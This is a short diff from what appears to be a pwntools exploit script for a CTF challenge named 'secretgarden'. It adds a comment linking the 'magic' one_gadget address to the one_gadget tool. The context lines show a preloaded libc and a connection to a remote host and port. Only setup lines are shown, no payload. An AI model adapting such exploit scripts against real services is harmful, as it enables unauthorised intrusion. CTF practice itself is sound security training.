@@ -12,7 +12,7 @@ context.arch = 'amd64'
 #y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
 #print util.proc.pidof(y)
 
-magic = 0x4008de
+magic = 0x4008de # https://github.com/david942j/one_gadget
 
 host , port = '146.185.132.36' , 19153
 y = remote( host , port )
